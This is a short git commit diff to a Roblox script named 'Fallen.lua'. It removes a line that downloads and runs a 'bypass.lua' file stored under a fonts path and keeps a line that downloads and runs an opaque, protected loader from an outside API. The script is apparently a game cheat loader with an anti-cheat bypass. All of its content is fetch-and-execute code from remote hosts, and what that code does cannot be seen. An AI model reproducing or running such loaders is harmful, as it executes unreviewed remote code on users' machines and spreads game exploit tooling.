1d609adb5ecce328c105250021ce0877893ef26e
123 <leftstacie@gmail.com>
2026-06-04 16:21:03 +0100

    Update Fallen.lua

--- Games/Fallen.lua
+++ Games/Fallen.lua
@@ -1,3 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/3stq/athena-resources/refs/heads/main/Fonts/bypass.lua"))() -- PRELOAD
-task.wait(2)
 loadstring(game:HttpGet("https://luaprot.net/api/v2/loaders/get/75922318963981132151"))()
